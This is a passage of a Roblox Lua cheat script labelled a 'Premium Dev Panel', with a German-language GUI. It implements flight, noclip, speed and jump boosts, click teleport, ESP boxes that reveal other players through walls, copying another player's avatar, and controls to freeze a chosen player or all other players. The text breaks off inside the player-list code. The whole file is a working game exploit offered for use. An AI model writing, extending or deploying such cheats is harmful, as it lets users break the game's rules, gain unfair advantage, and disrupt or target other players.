-- =======================================================================
-- ULTRACLEAR PREMIUM DEV PANEL (V9.2 - TARGET FREEZE & FREEZE ALL)
-- =======================================================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

if not game:IsLoaded() then game.Loaded:Wait() end
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local camera = workspace.CurrentCamera
local mouse = player:GetMouse()

local THEME = {
    Background = Color3.fromRGB(20, 22, 28),
    Sidebar = Color3.fromRGB(12, 14, 18),
    Accent = Color3.fromRGB(0, 180, 255),
    AccentGlow = Color3.fromRGB(0, 120, 255),
    TextMain = Color3.fromRGB(255, 255, 255),
    TextActive = Color3.fromRGB(0, 180, 255),
    TextDark = Color3.fromRGB(160, 165, 175),
    CardBg = Color3.fromRGB(30, 33, 42),
    Border = Color3.fromRGB(45, 48, 60),
    ToggleOff = Color3.fromRGB(60, 63, 75),
    ToggleOn = Color3.fromRGB(0, 220, 130),
    ToggleKnob = Color3.fromRGB(255, 255, 255),
    Alert = Color3.fromRGB(255, 75, 75),
    IceBlue = Color3.fromRGB(0, 220, 255)
}

local TWEEN_FAST = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

_G.DevStates = _G.DevStates or {}
if _G.DevStates.Flying == nil then _G.DevStates.Flying = false end
if _G.DevStates.ClickTP == nil then _G.DevStates.ClickTP = false end
if _G.DevStates.Noclip == nil then _G.DevStates.Noclip = false end
if _G.DevStates.ESP == nil then _G.DevStates.ESP = false end
if type(_G.DevStates.FlySpeed) ~= "number" then _G.DevStates.FlySpeed = 65 end
if type(_G.DevStates.WalkSpeed) ~= "number" then _G.DevStates.WalkSpeed = 16 end
if type(_G.DevStates.JumpPower) ~= "number" then _G.DevStates.JumpPower = 50 end

_G.FrozenPlayers = _G.FrozenPlayers or {}

local flightConnection, noclipConnection, espConnection, freezeLoopConnection
local storageESP = {}
local currentTrack = nil

local existingGui = playerGui:FindFirstChild("PremiumDevDashboard")
if existingGui then existingGui:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PremiumDevDashboard"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local shadowFrame = Instance.new("Frame")
shadowFrame.Size = UDim2.new(0, 560, 0, 380)
shadowFrame.Position = UDim2.new(0.5, -280, 0.5, -190)
shadowFrame.BackgroundColor3 = THEME.AccentGlow
shadowFrame.BackgroundTransparency = 0.90
shadowFrame.BorderSizePixel = 0
shadowFrame.Parent = screenGui

local shadowCorner = Instance.new("UICorner"); shadowCorner.CornerRadius = UDim.new(0, 20); shadowCorner.Parent = shadowFrame
local shadowBlur = Instance.new("UIStroke"); shadowBlur.Color = THEME.AccentGlow; shadowBlur.Thickness = 5; shadowBlur.Transparency = 0.8; shadowBlur.Parent = shadowFrame

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 540, 0, 360)
mainFrame.Position = UDim2.new(0.5, -270, 0.5, -180)
mainFrame.BackgroundColor3 = THEME.Background
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner"); mainCorner.CornerRadius = UDim.new(0, 14); mainCorner.Parent = mainFrame
local mainBorder = Instance.new("UIStroke"); mainBorder.Color = THEME.Border; mainBorder.Thickness = 1; mainBorder.Parent = mainFrame

-- Drag System
local dragging, dragInput, dragStart, startPos
local function updateDrag(input)
    local delta = input.Position - dragStart
    local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    mainFrame.Position = newPos
    shadowFrame.Position = newPos + UDim2.new(0, -10, 0, -10)
end
mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = input.Position; startPos = mainFrame.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
mainFrame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then updateDrag(input) end end)

-- Sidebar
local sidebar = Instance.new("Frame")
sidebar.Size = UDim2.new(0, 160, 1, 0); sidebar.BackgroundColor3 = THEME.Sidebar; sidebar.BorderSizePixel = 0; sidebar.Parent = mainFrame
local sidebarCorner = Instance.new("UICorner"); sidebarCorner.CornerRadius = UDim.new(0, 14); sidebarCorner.Parent = sidebar
local sidebarFix = Instance.new("Frame"); sidebarFix.Size = UDim2.new(0, 20, 1, 0); sidebarFix.Position = UDim2.new(1, -20, 0, 0); sidebarFix.BackgroundColor3 = THEME.Sidebar; sidebarFix.BorderSizePixel = 0; sidebarFix.ZIndex = 0; sidebarFix.Parent = sidebar

local appTitle = Instance.new("TextLabel")
appTitle.Size = UDim2.new(1, 0, 0, 55); appTitle.Text = "<font color='#00b4ff'>⚡</font> CORE.PANEL"; appTitle.TextColor3 = THEME.TextMain; appTitle.Font = Enum.Font.GothamBold; appTitle.TextSize = 13; appTitle.RichText = true; appTitle.BackgroundTransparency = 1; appTitle.ZIndex = 3; appTitle.Parent = sidebar

local tabContainer = Instance.new("Frame")
tabContainer.Size = UDim2.new(1, 0, 1, -60); tabContainer.Position = UDim2.new(0, 0, 0, 60); tabContainer.BackgroundTransparency = 1; tabContainer.ZIndex = 2; tabContainer.Parent = sidebar
local tabLayout = Instance.new("UIListLayout"); tabLayout.Padding = UDim.new(0, 5); tabLayout.SortOrder = Enum.SortOrder.LayoutOrder; tabLayout.Parent = tabContainer
local sidebarPadding = Instance.new("UIPadding"); sidebarPadding.PaddingLeft = UDim.new(0, 10); sidebarPadding.PaddingRight = UDim.new(0, 10); sidebarPadding.Parent = tabContainer

-- Content Area
local contentArea = Instance.new("Frame")
contentArea.Size = UDim2.new(1, -160, 1, 0); contentArea.Position = UDim2.new(0, 160, 0, 0); contentArea.BackgroundTransparency = 1; contentArea.Parent = mainFrame
local contentPadding = Instance.new("UIPadding"); contentPadding.PaddingTop = UDim.new(0, 15); contentPadding.PaddingBottom = UDim.new(0, 15); contentPadding.PaddingLeft = UDim.new(0, 15); contentPadding.PaddingRight = UDim.new(0, 15); contentPadding.Parent = contentArea

local activeTab = nil

local function createTab(name, order, setupFunc)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 34); btn.Text = "   " .. name; btn.TextColor3 = THEME.TextDark; btn.Font = Enum.Font.GothamMedium; btn.TextSize = 11; btn.TextXAlignment = Enum.TextXAlignment.Left; btn.BackgroundTransparency = 1; btn.LayoutOrder = order; btn.ZIndex = 3; btn.Parent = tabContainer
    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 7); corner.Parent = btn

    local container = Instance.new("ScrollingFrame")
    container.Size = UDim2.new(1, 0, 1, 0)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ScrollBarThickness = 3
    container.ScrollBarImageColor3 = THEME.Accent
    container.Visible = false
    container.Parent = contentArea
    container.CanvasSize = UDim2.new(0, 0, 0, 0)

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = container

    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        container.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
    end)
    
    setupFunc(container)

    local function select()
        if activeTab then
            activeTab.Btn.TextColor3 = THEME.TextDark
            activeTab.Container.Visible = false
            TweenService:Create(activeTab.Btn, TWEEN_FAST, {BackgroundTransparency = 1}):Play()
        end
        activeTab = {Btn = btn, Container = container}
        btn.TextColor3 = THEME.TextActive
        container.Visible = true
        TweenService:Create(btn, TWEEN_FAST, {BackgroundTransparency = 0, BackgroundColor3 = THEME.CardBg}):Play()
    end

    btn.MouseEnter:Connect(function() if activeTab == nil or activeTab.Btn ~= btn then TweenService:Create(btn, TWEEN_FAST, {TextColor3 = THEME.TextMain, BackgroundTransparency = 0.5, BackgroundColor3 = THEME.CardBg}):Play() end end)
    btn.MouseLeave:Connect(function() if activeTab == nil or activeTab.Btn ~= btn then TweenService:Create(btn, TWEEN_FAST, {TextColor3 = THEME.TextDark, BackgroundTransparency = 1}):Play() end end)
    btn.MouseButton1Click:Connect(select)
    return select
end

local function createToggleRow(parent, order, labelText, defaultState, callback)
    local state = defaultState or false
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, -6, 0, 42); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.LayoutOrder = order; row.Parent = parent
    local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 8); rowCorner.Parent = row
    local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.7, 0, 1, 0); label.Position = UDim2.new(0, 12, 0, 0); label.Text = labelText; label.TextColor3 = THEME.TextMain; label.Font = Enum.Font.GothamMedium; label.TextSize = 12; label.TextXAlignment = Enum.TextXAlignment.Left; label.BackgroundTransparency = 1; label.Parent = row
    
    local switch = Instance.new("TextButton")
    switch.Size = UDim2.new(0, 36, 0, 20); switch.Position = UDim2.new(1, -48, 0.5, -10); switch.BackgroundColor3 = state and THEME.ToggleOn or THEME.ToggleOff; switch.Text = ""; switch.Parent = row
    local switchCorner = Instance.new("UICorner"); switchCorner.CornerRadius = UDim.new(1, 0); switchCorner.Parent = switch
    
    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 14, 0, 14); dot.Position = state and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7); dot.BackgroundColor3 = THEME.ToggleKnob; dot.BorderSizePixel = 0; dot.Parent = switch
    local dotCorner = Instance.new("UICorner"); dotCorner.CornerRadius = UDim.new(1, 0); dotCorner.Parent = dot

    switch.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(switch, TWEEN_FAST, {BackgroundColor3 = state and THEME.ToggleOn or THEME.ToggleOff}):Play()
        TweenService:Create(dot, TWEEN_FAST, {Position = state and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)}):Play()
        callback(state)
    end)
end

local function createSliderRow(parent, order, labelText, min, max, default, callback)
    local val = default or min
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, -6, 0, 46); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.LayoutOrder = order; row.Parent = parent
    local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 8); rowCorner.Parent = row
    local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.6, 0, 0, 22); label.Position = UDim2.new(0, 12, 0, 3); label.Text = labelText; label.TextColor3 = THEME.TextMain; label.Font = Enum.Font.GothamMedium; label.TextSize = 11; label.TextXAlignment = Enum.TextXAlignment.Left; label.BackgroundTransparency = 1; label.Parent = row
    
    local valLabel = Instance.new("TextLabel")
    valLabel.Size = UDim2.new(0.3, 0, 0, 22); valLabel.Position = UDim2.new(0.7, -12, 0, 3); valLabel.Text = tostring(val); valLabel.TextColor3 = THEME.Accent; valLabel.Font = Enum.Font.GothamBold; valLabel.TextSize = 11; valLabel.TextXAlignment = Enum.TextXAlignment.Right; valLabel.BackgroundTransparency = 1; valLabel.Parent = row

    local sliderBg = Instance.new("TextButton")
    sliderBg.Size = UDim2.new(1, -24, 0, 5); sliderBg.Position = UDim2.new(0, 12, 0, 30); sliderBg.BackgroundColor3 = THEME.Background; sliderBg.Text = ""; sliderBg.AutoButtonColor = false; sliderBg.Parent = row
    local sbCorner = Instance.new("UICorner"); sbCorner.CornerRadius = UDim.new(1, 0); sbCorner.Parent = sliderBg
    
    local pctInit = math.clamp((val - min) / (max - min), 0, 1)
    local sliderFill = Instance.new("Frame")
    sliderFill.Size = UDim2.new(pctInit, 0, 1, 0); sliderFill.BackgroundColor3 = THEME.Accent; sliderFill.BorderSizePixel = 0; sliderFill.Parent = sliderBg
    local sfCorner = Instance.new("UICorner"); sfCorner.CornerRadius = UDim.new(1, 0); sfCorner.Parent = sliderFill

    local sliderKnob = Instance.new("Frame")
    sliderKnob.Size = UDim2.new(0, 10, 0, 10); sliderKnob.Position = UDim2.new(pctInit, -5, 0.5, -5); sliderKnob.BackgroundColor3 = THEME.TextMain; sliderKnob.Parent = sliderBg
    local skCorner = Instance.new("UICorner"); skCorner.CornerRadius = UDim.new(1, 0); skCorner.Parent = sliderBg
    local skStroke = Instance.new("UIStroke"); skStroke.Color = THEME.Accent; skStroke.Thickness = 1.5; skStroke.Parent = sliderKnob

    local sliding = false
    local function updateSlider(input)
        local absPos = sliderBg.AbsolutePosition.X
        local absSize = sliderBg.AbsoluteSize.X
        local mousePos = input.Position.X
        local pct = math.clamp((mousePos - absPos) / absSize, 0, 1)
        
        sliderFill.Size = UDim2.new(pct, 0, 1, 0)
        sliderKnob.Position = UDim2.new(pct, -5, 0.5, -5)
        
        local value = math.floor(min + (max - min) * pct)
        valLabel.Text = tostring(value)
        callback(value)
    end

    sliderBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then sliding = true; updateSlider(input) end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then updateSlider(input) end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then sliding = false end
    end)
end

-- TARGET FREEZE ENGINE
local function applyFreezeToCharacter(char, freeze)
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = freeze
        end
    end
end

if not freezeLoopConnection then
    freezeLoopConnection = RunService.Heartbeat:Connect(function()
        for targetPlayer, isFrozen in pairs(_G.FrozenPlayers) do
            if isFrozen and targetPlayer and targetPlayer.Character then
                applyFreezeToCharacter(targetPlayer.Character, true)
            end
        end
    end)
end

local function toggleTargetFreeze(targetPlayer)
    if not targetPlayer then return end
    local isCurrentlyFrozen = _G.FrozenPlayers[targetPlayer] or false
    local newState = not isCurrentlyFrozen
    _G.FrozenPlayers[targetPlayer] = newState

    if targetPlayer.Character then
        applyFreezeToCharacter(targetPlayer.Character, newState)
    end
    return newState
end

-- EMOTE ENGINE
local function playCustomEmote(animId)
    if not humanoid then return end
    local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
    if not animator then return end

    if currentTrack then currentTrack:Stop() end

    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. tostring(animId)
    
    local success, track = pcall(function() return animator:LoadAnimation(anim) end)
    if success and track then
        currentTrack = track
        track.Priority = Enum.AnimationPriority.Action
        track:Play()
    end
end

-- MOVEMENT ENGINE
local function stopFlying()
    if flightConnection then flightConnection:Disconnect(); flightConnection = nil end
    if rootPart then rootPart.AssemblyLinearVelocity = Vector3.new(0,0,0) end
end

local function startFlying()
    stopFlying()
    if not rootPart then return end
    
    flightConnection = RunService.PreRender:Connect(function(deltaTime)
        if not rootPart or not rootPart.Parent or not _G.DevStates.Flying then stopFlying(); return end
        
        rootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        local cframe = camera.CFrame
        local direction = Vector3.new(0, 0, 0)
        
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then direction = direction + cframe.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then direction = direction - cframe.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then direction = direction - cframe.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then direction = direction + cframe.RightVector end
        
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then direction = direction + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then direction = direction - Vector3.new(0, 1, 0) end
        
        if direction.Magnitude > 0 then
            rootPart.CFrame = rootPart.CFrame + (direction.Unit * _G.DevStates.FlySpeed * deltaTime)
        end
    end)
end

local function stopNoclip() if noclipConnection then noclipConnection:Disconnect(); noclipConnection = nil end end
local function startNoclip()
    stopNoclip()
    noclipConnection = RunService.PreSimulation:Connect(function()
        if character and _G.DevStates.Noclip then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        else stopNoclip() end
    end)
end

-- ESP
local function removeESP(p)
    if storageESP[p] then
        if storageESP[p].Highlight then storageESP[p].Highlight:Destroy() end
        if storageESP[p].Billboard then storageESP[p].Billboard:Destroy() end
        if storageESP[p].Box then storageESP[p].Box:Destroy() end
        storageESP[p] = nil
    end
end

local function applyESP(p)
    if p == player then return end
    removeESP(p)
    local char = p.Character or p.CharacterAdded:Wait()
    local head = char:WaitForChild("Head", 5)
    local espRoot = char:WaitForChild("HumanoidRootPart", 5)
    if not head or not espRoot then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Adornee = char; highlight.FillColor = THEME.Accent; highlight.FillTransparency = 0.82
    highlight.OutlineColor = THEME.TextMain; highlight.OutlineTransparency = 0.2; highlight.Parent = char
    
    local boxBillboard = Instance.new("BillboardGui")
    boxBillboard.Adornee = espRoot; boxBillboard.Size = UDim2.new(4.5, 0, 6, 0); boxBillboard.AlwaysOnTop = true
    local boxStroke = Instance.new("UIStroke"); boxStroke.Color = THEME.Accent; boxStroke.Thickness = 1.5; boxStroke.Parent = boxBillboard
    local boxFrame = Instance.new("Frame"); boxFrame.Size = UDim2.new(1, 0, 1, 0); boxFrame.BackgroundTransparency = 1; boxFrame.Parent = boxBillboard
    boxBillboard.Parent = espRoot

    local billboard = Instance.new("BillboardGui")
    billboard.Adornee = head; billboard.Size = UDim2.new(0, 160, 0, 32); billboard.StudsOffset = Vector3.new(0, 3, 0); billboard.AlwaysOnTop = true
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0); textLabel.BackgroundTransparency = 1; textLabel.TextColor3 = THEME.TextMain; textLabel.Font = Enum.Font.GothamBold; textLabel.TextSize = 11; textLabel.TextStrokeTransparency = 0.4; textLabel.Parent = billboard
    billboard.Parent = head
    
    storageESP[p] = {Highlight = highlight, Billboard = billboard, Box = boxBillboard, Label = textLabel, Character = char}
end

local function cleanAllESP() for p, _ in pairs(storageESP) do removeESP(p) end end
local function startESP()
    cleanAllESP()
    espConnection = RunService.RenderStepped:Connect(function()
        if not _G.DevStates.ESP then if espConnection then espConnection:Disconnect(); espConnection = nil end; cleanAllESP(); return end
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                if not storageESP[p] or storageESP[p].Character ~= p.Character then 
                    applyESP(p)
                else
                    local myRoot = rootPart
                    local targetRoot = p.Character:FindFirstChild("HumanoidRootPart")
                    if myRoot and targetRoot and storageESP[p].Label then
                        local dist = math.floor((myRoot.Position - targetRoot.Position).Magnitude)
                        storageESP[p].Label.Text = string.format("⭐ %s\n<font color='#00b4ff'>[%d Studs]</font>", p.DisplayName, dist)
                        storageESP[p].Label.RichText = true
                    end
                end
            elseif storageESP[p] then removeESP(p) end
        end
    end)
end

-- TABS
local openMovement = createTab("Movement", 1, function(parent)
    createToggleRow(parent, 1, "Flugmodus aktivieren", _G.DevStates.Flying, function(enabled)
        _G.DevStates.Flying = enabled
        if enabled then startFlying() else stopFlying() end
    end)
    createSliderRow(parent, 2, "Flug-Geschwindigkeit", 10, 300, _G.DevStates.FlySpeed, function(value)
        _G.DevStates.FlySpeed = value
    end)
    createSliderRow(parent, 3, "Lauf-Geschwindigkeit", 16, 250, _G.DevStates.WalkSpeed, function(value)
        _G.DevStates.WalkSpeed = value
        if humanoid then humanoid.WalkSpeed = value end
    end)
    createSliderRow(parent, 4, "Sprungkraft", 50, 300, _G.DevStates.JumpPower, function(value)
        _G.DevStates.JumpPower = value
        if humanoid then 
            humanoid.UseJumpPower = true
            humanoid.JumpPower = value 
        end
    end)
    createToggleRow(parent, 5, "Noclip (Durch Wände)", _G.DevStates.Noclip, function(enabled)
        _G.DevStates.Noclip = enabled
        if enabled then startNoclip() else stopNoclip() end
    end)
    createToggleRow(parent, 6, "Klick-Teleportation", _G.DevStates.ClickTP, function(enabled)
        _G.DevStates.ClickTP = enabled
    end)
end)

createTab("Render / ESP", 2, function(parent)
    createToggleRow(parent, 1, "Verbessertes Spieler-ESP", _G.DevStates.ESP, function(enabled)
        _G.DevStates.ESP = enabled
        if enabled then startESP() else cleanAllESP() end
    end)
end)

createTab("Emotes", 3, function(parent)
    local hardcoreEmotes = {
        {Name = "🔥 Backflip Spin", Id = 3333331310},
        {Name = "🤸 Breakdance Headspin", Id = 10214311282},
        {Name = "⚡ Fast Shuffle / Hype", Id = 3696757129},
        {Name = "🕺 Godly Rock Dance", Id = 3338083565},
        {Name = "🧟 Zombie Slump Walk", Id = 3303391864},
        {Name = "🕺 Monster Mash / HipHop", Id = 3576686446},
        {Name = "✨ K-Pop Popstar Dance", Id = 4212450212},
        {Name = "🤡 Crazy Floating / Alien", Id = 3338097978}
    }

    local stopRow = Instance.new("Frame")
    stopRow.Size = UDim2.new(1, -6, 0, 36); stopRow.BackgroundColor3 = THEME.Alert; stopRow.BorderSizePixel = 0; stopRow.LayoutOrder = 0; stopRow.Parent = parent
    local stopCorner = Instance.new("UICorner"); stopCorner.CornerRadius = UDim.new(0, 8); stopCorner.Parent = stopRow
    
    local stopBtn = Instance.new("TextButton")
    stopBtn.Size = UDim2.new(1, 0, 1, 0); stopBtn.BackgroundTransparency = 1; stopBtn.Text = "🛑 EMOTE STOPPEN"; stopBtn.TextColor3 = THEME.TextMain; stopBtn.Font = Enum.Font.GothamBold; stopBtn.TextSize = 11; stopBtn.Parent = stopRow
    stopBtn.MouseButton1Click:Connect(function()
        if currentTrack then currentTrack:Stop() end
    end)

    for order, emoteData in ipairs(hardcoreEmotes) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -6, 0, 40); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.LayoutOrder = order; row.Parent = parent
        local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 8); rowCorner.Parent = row
        local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0.65, 0, 1, 0); label.Position = UDim2.new(0, 12, 0, 0); label.Text = emoteData.Name; label.TextColor3 = THEME.TextMain; label.Font = Enum.Font.GothamMedium; label.TextSize = 12; label.TextXAlignment = Enum.TextXAlignment.Left; label.BackgroundTransparency = 1; label.Parent = row

        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 70, 0, 24); btn.Position = UDim2.new(1, -82, 0.5, -12); btn.BackgroundColor3 = THEME.Accent; btn.TextColor3 = THEME.Sidebar; btn.Font = Enum.Font.GothamBold; btn.TextSize = 10; btn.Text = "PLAY"; btn.Parent = row
        local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = btn

        btn.MouseButton1Click:Connect(function()
            playCustomEmote(emoteData.Id)
        end)
    end
end)

createTab("Skin Stealer", 4, function(parent)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, -6, 0, 110); card.BackgroundColor3 = THEME.CardBg; card.BorderSizePixel = 0; card.Parent = parent
    local cardCorner = Instance.new("UICorner"); cardCorner.CornerRadius = UDim.new(0, 8); cardCorner.Parent = card
    local cardBorder = Instance.new("UIStroke"); cardBorder.Color = THEME.Border; cardBorder.Parent = card
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -30, 0, 36); textBox.Position = UDim2.new(0, 15, 0, 15); textBox.BackgroundColor3 = THEME.Background
    textBox.BorderSizePixel = 0; textBox.TextColor3 = THEME.TextMain; textBox.PlaceholderColor3 = THEME.TextDark; textBox.PlaceholderText = "Exakten Spielernamen eingeben..."; textBox.Font = Enum.Font.Gotham; textBox.TextSize = 13; textBox.Text = ""; textBox.Parent = card
    local tbCorner = Instance.new("UICorner"); tbCorner.CornerRadius = UDim.new(0, 6); tbCorner.Parent = textBox
    local tbBorder = Instance.new("UIStroke"); tbBorder.Color = THEME.Border; tbBorder.Parent = textBox
    
    local stealBtn = Instance.new("TextButton")
    stealBtn.Size = UDim2.new(1, -30, 0, 34); stealBtn.Position = UDim2.new(0, 15, 0, 60); stealBtn.BackgroundColor3 = THEME.Accent; stealBtn.TextColor3 = THEME.Sidebar; stealBtn.Font = Enum.Font.GothamBold; stealBtn.TextSize = 13; stealBtn.Text = "Skin anwenden (Lokal)"; stealBtn.Parent = card
    local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = stealBtn
    
    stealBtn.MouseButton1Click:Connect(function()
        local targetName = textBox.Text
        local targetPlayer = Players:FindFirstChild(targetName)
        if not targetPlayer then
            for _, p in ipairs(Players:GetPlayers()) do
                if string.lower(p.Name):sub(1, #targetName) == string.lower(targetName) or string.lower(p.DisplayName):sub(1, #targetName) == string.lower(targetName) then
                    targetPlayer = p; break
                end
            end
        end
        if targetPlayer and player.Character then
            local myHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if myHumanoid then
                local success, description = pcall(function() return Players:GetHumanoidDescriptionFromUserId(targetPlayer.UserId) end)
                if success and description then
                    local applySuccess = pcall(function() myHumanoid:ApplyDescription(description) end)
                    if applySuccess then textBox.Text = "Skin erfolgreich kopiert!"; task.wait(1.5); textBox.Text = ""
                    else textBox.Text = "Fehler beim Rendern!"; task.wait(1.5); textBox.Text = "" end
                else textBox.Text = "Roblox-API Fehler!"; task.wait(1.5); textBox.Text = "" end
            end
        else textBox.Text = "Spieler nicht im Server!"; task.wait(1.5); textBox.Text = "" end
    end)
end)

createTab("Player Control", 5, function(parent)
    local headerFrame = Instance.new("Frame")
    headerFrame.Size = UDim2.new(1, -6, 0, 36); headerFrame.BackgroundTransparency = 1; headerFrame.Parent = parent

    local searchBar = Instance.new("TextBox")
    searchBar.Size = UDim2.new(0.48, 0, 1, 0); searchBar.BackgroundColor3 = THEME.CardBg; searchBar.BorderSizePixel = 0; searchBar.TextColor3 = THEME.TextMain; searchBar.PlaceholderColor3 = THEME.TextDark; searchBar.PlaceholderText = "🔍 Spieler Suchen..."; searchBar.Font = Enum.Font.Gotham; searchBar.TextSize = 11; searchBar.Text = ""; searchBar.Parent = headerFrame
    local searchCorner = Instance.new("UICorner"); searchCorner.CornerRadius = UDim.new(0, 6); searchCorner.Parent = searchBar
    local searchBorder = Instance.new("UIStroke"); searchBorder.Color = THEME.Border; searchBorder.Parent = searchBar

    local freezeAllBtn = Instance.new("TextButton")
    freezeAllBtn.Size = UDim2.new(0.24, 0, 1, 0); freezeAllBtn.Position = UDim2.new(0.50, 0, 0, 0); freezeAllBtn.BackgroundColor3 = THEME.IceBlue; freezeAllBtn.TextColor3 = THEME.Sidebar; freezeAllBtn.Font = Enum.Font.GothamBold; freezeAllBtn.TextSize = 10; freezeAllBtn.Text = "❄️ FREEZE ALL"; freezeAllBtn.Parent = headerFrame
    local faCorner = Instance.new("UICorner"); faCorner.CornerRadius = UDim.new(0, 6); faCorner.Parent = freezeAllBtn

    local unviewBtn = Instance.new("TextButton")
    unviewBtn.Size = UDim2.new(0.24, 0, 1, 0); unviewBtn.Position = UDim2.new(0.76, 0, 0, 0); unviewBtn.BackgroundColor3 = THEME.Alert; unviewBtn.TextColor3 = THEME.TextMain; unviewBtn.Font = Enum.Font.GothamBold; unviewBtn.TextSize = 10; unviewBtn.Text = "UNWATCH"; unviewBtn.Parent = headerFrame
    local unviewCorner = Instance.new("UICorner"); unviewCorner.CornerRadius = UDim.new(0, 6); unviewCorner.Parent = unviewBtn
    
    unviewBtn.MouseButton1Click:Connect(function() if humanoid then camera.CameraSubject = humanoid end end)

    local freezeAllActive = false
    freezeAllBtn.MouseButton1Click:Connect(function()
        freezeAllActive = not freezeAllActive
        freezeAllBtn.Text = freezeAllActive and "🔥 UNFREEZE ALL" or "❄️ FREEZE ALL"
        freezeAllBtn.BackgroundColor3 = freezeAllActive and THEME.Alert or THEME.IceBlue
        
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player then
                _G.FrozenPlayers[p] = freezeAllActive
                if p.Character then applyFreezeToCharacter(p.Character, freezeAllActive) end
            end
        end
    end)

    local listHolder = Instance.new("Frame")
    listHolder.Size = UDim2.new(1, -6, 0, 0); listHolder.BackgroundTransparency = 1; listHolder.Parent = parent
    local listLayout = Instance.new("UIListLayout"); listLayout.Padding = UDim.new(0, 6); listLayout.SortOrder = Enum.SortOrder.Name; listLayout.Parent = listHolder

    local function updateList()
        local filterText = string.lower(searchBar.Text)
        for _, child in ipairs(listHolder:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end

        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player then
                if filterText == "" or string.find(string.lower(p.DisplayName), filterText) or string.find(string.lower(p.Name), filterText) then
                    local row = Instance.new("Frame")
